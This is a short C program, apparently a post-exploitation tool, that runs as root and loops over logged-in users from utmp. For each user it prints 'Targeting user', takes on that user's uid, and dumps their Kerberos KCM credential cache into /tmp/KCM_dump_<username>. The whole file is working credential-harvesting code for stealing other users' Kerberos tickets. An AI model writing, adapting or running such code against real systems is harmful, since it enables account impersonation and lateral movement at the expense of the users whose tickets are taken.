#include <krb5.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <pwd.h>
#include <utmp.h>

int main(void) {
    krb5_context ctx;
    krb5_ccache src = NULL, dst = NULL;
    krb5_principal princ = NULL;
    krb5_error_code ret;
    struct utmp *ut;
    struct passwd *pw;

    /* Iterate over each user */
    setutent();
    while ((ut = getutent()) != NULL) {
        
        if (ut->ut_type != USER_PROCESS) continue;
        pw = getpwnam(ut->ut_user);
        if (!pw) continue;
        printf("Targeting user=%s uid=%d\n", pw->pw_name, pw->pw_uid);
                seteuid(0); 
                if (seteuid(pw->pw_uid) != 0) {
                        printf("setuid(%d) failed\n", pw->pw_uid);
                        continue;
                }

                ret = krb5_init_context(&ctx);
                ret = krb5_cc_resolve(ctx, "KCM:", &src);
                char ccname[256];
                snprintf(ccname, sizeof(ccname), "FILE:/tmp/KCM_dump_%s", pw->pw_name);
                ret = krb5_cc_resolve(ctx, ccname, &dst);
                ret = krb5_cc_get_principal(ctx, src, &princ);
                ret = krb5_cc_initialize(ctx, dst, princ);
                ret = krb5_cc_copy_creds(ctx, src, dst);
                printf("KCM cache successfully copied to /tmp/KCM_dump_%s\n", pw->pw_name);

    }
    endutent();

    /* Cleanup */
    if (princ) krb5_free_principal(ctx, princ);
    if (src) krb5_cc_close(ctx, src);
    if (dst) krb5_cc_close(ctx, dst);
    krb5_free_context(ctx);

    return ret ? 1 : 0;
}
